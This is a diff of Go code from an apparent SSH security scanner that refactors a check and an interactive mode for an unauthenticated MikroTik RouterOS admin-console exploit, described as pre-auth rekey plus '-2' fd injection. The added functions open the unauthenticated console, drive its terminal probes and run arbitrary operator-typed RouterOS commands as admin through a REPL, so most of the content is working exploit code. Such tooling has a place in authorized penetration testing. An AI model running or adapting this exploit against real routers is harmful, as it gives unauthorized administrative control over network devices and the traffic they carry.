@@ -9,7 +9,6 @@ import (
 	"os"
 	"regexp"
 	"strings"
-	"sync"
 	"time"
 
 	"golang.org/x/term"
@@ -133,12 +132,7 @@ func mikrotikFD2Options(addr string, conf *ScanConfig, options *auth.Options) *a
 		WithPostAuthHandler(func(c net.Conn, uac *ssh.UnauthClientConn, r *auth.AuthResult) error {
 			// CVE-2026-67279: enter the connection protocol unauthenticated,
 			// leaving the rejected "-2" username pending for the login helper.
-			if err := uac.RequestKeyExchange(); err != nil {
-				conf.Logger.Debugf("%s %s rekey request failed: %v", addr, tname, err)
-				return err
-			}
-			conf.Logger.Tracef("%s %s pre-auth rekey requested with '-2' pending", addr, tname)
-			return nil
+			return mikrotikRequestRekey(addr, conf, tname, uac)
 		})
 }
 
@@ -161,11 +155,138 @@ func mikrotikFD2OpenConsole(ses *ssh.Session) (io.WriteCloser, error) {
 	return stdIn, nil
 }
 
-// sshInteractVulnMikrotikFD2Inject re-establishes the unauthenticated
-// CVE-2026-86060 full-admin console and drives it interactively. The RouterOS
-// console is a PTY that emits DECID/CPR sizing probes and can render
-// vertically; a background relay answers those probes and echoes console
-// output while the foreground loop forwards each stdin line as a command.
+// mikrotikFD2AnswerProbes answers any DECID/CPR terminal probes and any [Y/n]
+// nag present in raw, updating the counters so each is answered exactly once.
+func mikrotikFD2AnswerProbes(raw []byte, cprAnswered *int, decidAnswered, nagAnswered *bool, w io.Writer) error {
+	if !*decidAnswered && bytes.Contains(raw, []byte("\x1bZ")) {
+		*decidAnswered = true
+		_, _ = w.Write([]byte("\x1b[?1;2c"))
+	}
+	if n := bytes.Count(raw, []byte("\x1b[6n")); *cprAnswered < n {
+		for *cprAnswered < n {
+			*cprAnswered = *cprAnswered + 1
+			if _, err := w.Write([]byte("\x1b[24;80R")); err != nil {
+				return err
+			}
+		}
+	}
+	if !*nagAnswered && strings.Contains(mikrotikFD2Squashed(raw), "[Y/n]") {
+		*nagAnswered = true
+		_, _ = w.Write([]byte("n"))
+	}
+	return nil
+}
+
+// mikrotikFD2DriveConsole answers the RouterOS console's DECID/CPR terminal
+// probes and any [Y/n] nag until the admin prompt appears, then returns nil.
+// The console's initial handshake must complete before the first command is
+// sent; sending input too early breaks the console and closes the session.
+func mikrotikFD2DriveConsole(stdOut *auth.SyncByteBuffer, w io.Writer, timeout time.Duration) error {
+	deadline := time.Now().Add(timeout)
+	cprAnswered := 0
+	decidAnswered := false
+	nagAnswered := false
+	for time.Now().Before(deadline) {
+		raw := stdOut.Peek()
+		if err := mikrotikFD2AnswerProbes(raw, &cprAnswered, &decidAnswered, &nagAnswered, w); err != nil {
+			return err
+		}
+		if mikrotikFD2PromptRe.MatchString(mikrotikFD2Squashed(raw)) {
+			return nil
+		}
+		time.Sleep(time.Millisecond * 50)
+	}
+	return fmt.Errorf("no RouterOS console prompt")
+}
+
+// mikrotikFD2RunCommand establishes a fresh unauthenticated fd-2 console, runs
+// cmd, and returns the cleaned console output. RouterOS does not keep the
+// injected PTY console usable across commands on a persistent session, so each
+// command re-runs the one-shot sequence proven by the detection check: rekey,
+// pty+shell, fd-2 identity injection, drive to the prompt, then one command.
+func mikrotikFD2RunCommand(addr string, conf *ScanConfig, options *auth.Options, cmd string) (string, error) {
+	tname := checkVulnMikrotikFD2Inject
+
+	o := mikrotikFD2Options(addr, conf, options).
+		WithSessionHandler(func(c net.Conn, sclient *ssh.Client, ses *ssh.Session, r *auth.AuthResult) error {
+			_ = c.SetDeadline(time.Now().Add(time.Second * 25))
+
+			stdOut := auth.NewSyncByteBuffer(1024 * 64)
+			ses.Stdout = stdOut
+			ses.Stderr = stdOut
+			stdIn, err := mikrotikFD2OpenConsole(ses)
+			if err != nil {
+				return err
+			}
+			if err := mikrotikFD2DriveConsole(stdOut, stdIn, 20*time.Second); err != nil {
+				return err
+			}
+
+			mark := len(mikrotikFD2Squashed(stdOut.Peek()))
+			if _, err := stdIn.Write([]byte(cmd + "\r")); err != nil {
+				return err
+			}
+
+			// Wait for the prompt to reappear (command complete) or a timeout.
+			deadline := time.Now().Add(10 * time.Second)
+			for time.Now().Before(deadline) {
+				squashed := mikrotikFD2Squashed(stdOut.Peek())
+				if len(squashed) > mark && mikrotikFD2PromptRe.MatchString(squashed[mark:]) {
+					break
+				}
+				time.Sleep(time.Millisecond * 50)
+			}
+			r.SessionOutput = auth.CleanSessionOutput(stdOut.Peek())
+			return nil
+		})
+
+	var res *auth.AuthResult
+	for attempt := 1; attempt <= 3; attempt++ {
+		res = auth.SSHAuth(addr, o, auth.SSHAuthHandlerSingle(ssh.None()))
+		if res.Stage == "session" {
+			break
+		}
+		conf.Logger.Debugf("%s %s run command attempt %d failed (stage %s): %v", addr, tname, attempt, res.Stage, res.Error)
+		time.Sleep(time.Second)
+	}
+	if res.Stage != "session" || res.SessionOutput == "" {
+		return "", fmt.Errorf("unable to establish console: %v", res.Error)
+	}
+	return res.SessionOutput, nil
+}
+
+// mikrotikFD2Display prepares raw console output for the terminal: strips ANSI
+// escapes, normalizes CR to LF, drops the injected identity echo and startup
+// log spam by starting at the command echo, and removes RouterOS prompt lines.
+func mikrotikFD2Display(cmd, raw string) string {
+	b := mikrotikFD2ANSIRe.ReplaceAll([]byte(raw), nil)
+	b = bytes.ReplaceAll(b, []byte("\r"), []byte("\n"))
+	b = bytes.ReplaceAll(b, []byte{0}, nil)
+	s := string(b)
+
+	if idx := strings.Index(s, cmd); idx >= 0 {
+		s = s[idx:]
+	}
+
+	var out []string
+	for _, ln := range strings.Split(s, "\n") {
+		t := strings.TrimSpace(ln)
+		if t == "" {
+			continue
+		}
+		// Drop RouterOS prompt lines ("[0@host] >").
+		if strings.HasPrefix(t, "[") && strings.HasSuffix(t, ">") {
+			continue
+		}
+		out = append(out, strings.TrimRight(ln, " \t"))
+	}
+	return strings.Join(out, "\n")
+}
+
+// sshInteractVulnMikrotikFD2Inject drives the unauthenticated CVE-2026-86060
+// RouterOS admin console as a line-based repl. Each command establishes a fresh
+// fd-2 console because RouterOS terminates the injected PTY console rather than
+// keeping it usable across commands.
 func sshInteractVulnMikrotikFD2Inject(addr string, conf *ScanConfig, options *auth.Options, root *auth.AuthResult) *auth.AuthResult {
 	tname := checkVulnMikrotikFD2Inject
 
@@ -174,111 +295,44 @@ func sshInteractVulnMikrotikFD2Inject(addr string, conf *ScanConfig, options *au
 		return nil
 	}
 
-	handler := func(c net.Conn, sclient *ssh.Client, ses *ssh.Session, r *auth.AuthResult) error {
-		_ = c.SetDeadline(time.Time{})
-		defer sclient.Close()
+	fmt.Printf("\r\nMikroTik RouterOS admin console via '-2' fd injection on %s\r\n", addr)
+	fmt.Printf("Type RouterOS commands, or 'exit' to quit.\r\n\r\n")
 
-		stdOut := auth.NewSyncByteBuffer(1024 * 64)
-		ses.Stdout = stdOut
-		ses.Stderr = stdOut
-		stdIn, err := mikrotikFD2OpenConsole(ses)
+	reader := bufio.NewReader(os.Stdin)
+	for {
+		fmt.Printf("[admin@%s] > ", addr)
+		line, err := reader.ReadString('\n')
 		if err != nil {
-			return err
-		}
-		defer stdIn.Close()
-
-		fmt.Printf("\r\nMikroTik RouterOS admin console via '-2' fd injection on %s\r\n", addr)
-		fmt.Printf("Type RouterOS commands, or 'exit' to quit.\r\n\r\n")
-
-		// The RouterOS console is a PTY that emits DECID/CPR sizing probes.
-		// We answer those ourselves and strip them from the output before it
-		// reaches the user's terminal; otherwise the terminal emulator would
-		// answer the probes on stdin, corrupting the command stream and
-		// eventually closing the session.
-		var inMu sync.Mutex
-		writeConsole := func(b []byte) error {
-			inMu.Lock()
-			defer inMu.Unlock()
-			_, err := stdIn.Write(b)
-			return err
-		}
-
-		stop := make(chan struct{})
-		defer close(stop)
-		go func() {
-			tick := time.NewTicker(time.Millisecond * 50)
-			defer tick.Stop()
-			var filter mikrotikFD2TerminalFilter
-			emitted := 0
-			cprAnswered := 0
-			decidAnswered := false
-			for {
-				select {
-				case <-stop:
-					return
-				case <-tick.C:
-				}
-				raw := stdOut.Peek()
-				delta := raw[emitted:]
-				emitted = len(raw)
-
-				if !decidAnswered && bytes.Contains(raw, []byte("\x1bZ")) {
-					decidAnswered = true
-					_ = writeConsole([]byte("\x1b[?1;2c"))
-				}
-				if n := bytes.Count(raw, []byte("\x1b[6n")); cprAnswered < n {
-					for cprAnswered < n {
-						cprAnswered++
-						if err := writeConsole([]byte("\x1b[24;80R")); err != nil {
-							return
-						}
-					}
-				}
-
-				if out := filter.Filter(delta); len(out) > 0 {
-					_, _ = os.Stdout.Write(out)
-					os.Stdout.Sync()
-				}
-			}
-		}()
-
-		reader := bufio.NewReader(os.Stdin)
-		for {
-			line, err := reader.ReadString('\n')
-			if err != nil {
-				if err == io.EOF {
-					return nil
-				}
-				return err
-			}
-			line = strings.TrimSpace(line)
-			if line == "" {
-				continue
-			}
-			switch strings.ToLower(line) {
-			case "exit", "quit", ".":
+			if err == io.EOF {
+				fmt.Printf("\r\n")
 				return nil
 			}
-			if err := writeConsole([]byte(line + "\r")); err != nil {
-				return err
-			}
+			conf.Logger.Errorf("%s %s stdin read failed: %v", addr, tname, err)
+			return nil
+		}
+		line = strings.TrimSpace(line)
+		if line == "" {
+			continue
+		}
+		switch strings.ToLower(line) {
+		case "exit", "quit", ".":
+			return nil
+		}
+
+		out, err := mikrotikFD2RunCommand(addr, conf, options, line)
+		if err != nil {
+			conf.Logger.Errorf("%s %s cannot run %q: %v", addr, tname, line, err)
+			continue
+		}
+		display := mikrotikFD2Display(line, out)
+		if display == "" {
+			fmt.Printf("(no output)\r\n")
+		} else {
+			_, _ = os.Stdout.WriteString(display)
+			_, _ = os.Stdout.WriteString("\r\n")
+			os.Stdout.Sync()
 		}
 	}
-
-	// Re-establish the unauthenticated console. The first attempt can fail at
-	// channel open if the RouterOS login helper is still tearing down the
-	// detection session's console, so retry a few times with a short delay.
-	var res *auth.AuthResult
-	for attempt := 1; attempt <= 3; attempt++ {
-		res = auth.SSHAuth(addr, mikrotikFD2Options(addr, conf, options).WithSessionHandler(handler), auth.SSHAuthHandlerSingle(ssh.None()))
-		if res.Stage == "session" {
-			break
-		}
-		conf.Logger.Debugf("%s %s interact reconnect attempt %d failed (stage %s): %v", addr, tname, attempt, res.Stage, res.Error)
-		time.Sleep(time.Second * 2)
-	}
-
-	return res
 }
 
 func sshCheckVulnMikrotikFD2Inject(addr string, conf *ScanConfig, options *auth.Options, root *auth.AuthResult) *auth.AuthResult {
@@ -301,46 +355,22 @@ func sshCheckVulnMikrotikFD2Inject(addr string, conf *ScanConfig, options *auth.
 				return err
 			}
 
-			// Drive the console: answer DECID/CPR terminal probes (always
-			// with the requested 24x80 geometry), wait for the prompt, then
-			// run a read-only proof command.
-			sent := false
-			mark := 0
-			cprAnswered := 0
-			decidAnswered := false
-			nagAnswered := false
-			deadline := time.Now().Add(time.Second * 20)
+			// Drive the console to the admin prompt, answering its DECID/CPR
+			// terminal probes, before running the read-only proof command.
+			if err := mikrotikFD2DriveConsole(stdOut, stdIn, 20*time.Second); err != nil {
+				return err
+			}
+			mark := len(mikrotikFD2Squashed(stdOut.Peek()))
+			if _, err := stdIn.Write([]byte("/system resource print\r")); err != nil {
+				return err
+			}
+
+			// Wait for the proof output to appear after the prompt.
+			deadline := time.Now().Add(10 * time.Second)
 			for time.Now().Before(deadline) {
-				raw := stdOut.Peek()
-				if !decidAnswered && bytes.Contains(raw, []byte("\x1bZ")) {
-					decidAnswered = true
-					_, _ = stdIn.Write([]byte("\x1b[?1;2c"))
-				}
-				if n := bytes.Count(raw, []byte("\x1b[6n")); cprAnswered < n {
-					for cprAnswered < n {
-						cprAnswered++
-						if _, err := stdIn.Write([]byte("\x1b[24;80R")); err != nil {
-							return err
-						}
-					}
-				}
-				squashed := mikrotikFD2Squashed(raw)
-				if !nagAnswered && strings.Contains(squashed, "[Y/n]") {
-					nagAnswered = true
-					_, _ = stdIn.Write([]byte("n"))
-					continue
-				}
-				if !sent {
-					if mikrotikFD2PromptRe.MatchString(squashed) {
-						conf.Logger.Tracef("%s %s console prompt detected after fd-2 injection", addr, tname)
-						if _, err := stdIn.Write([]byte("/system resource print\r")); err != nil {
-							return err
-						}
-						sent = true
-						mark = len(squashed)
-					}
-				} else if strings.Contains(squashed[mark:], "version:") {
-					r.SessionOutput = auth.CleanSessionOutput(raw)
+				squashed := mikrotikFD2Squashed(stdOut.Peek())
+				if strings.Contains(squashed[mark:], "version:") {
+					r.SessionOutput = auth.CleanSessionOutput(stdOut.Peek())
 					return nil
 				}
 				time.Sleep(time.Millisecond * 50)
@@ -349,10 +379,19 @@ func sshCheckVulnMikrotikFD2Inject(addr string, conf *ScanConfig, options *auth.
 		})
 
 	// ssh.None() is rejected as expected; IgnoreAuthError keeps the
-	// connection open so the rekey + channel open follow.
-	res := auth.SSHAuth(addr, o, auth.SSHAuthHandlerSingle(ssh.None()))
+	// connection open so the rekey + channel open follow. The rekey/channel-open
+	// ordering is racy, so retry a few times before giving up.
+	var res *auth.AuthResult
+	for attempt := 1; attempt <= 3; attempt++ {
+		res = auth.SSHAuth(addr, o, auth.SSHAuthHandlerSingle(ssh.None()))
+		if res.Stage == "session" {
+			break
+		}
+		conf.Logger.Debugf("%s %s attempt %d did not open a session (stage %s): %v", addr, tname, attempt, res.Stage, res.Error)
+		time.Sleep(time.Second)
+	}
 	if res.Stage != "session" {
-		conf.Logger.Debugf("%s %s did not open a session (stage %s): %v", addr, tname, res.Stage, res.Error)
+		conf.Logger.Debugf("%s %s did not open a session: %v", addr, tname, res.Error)
 		return nil
 	}
 	if res.SessionOutput == "" {
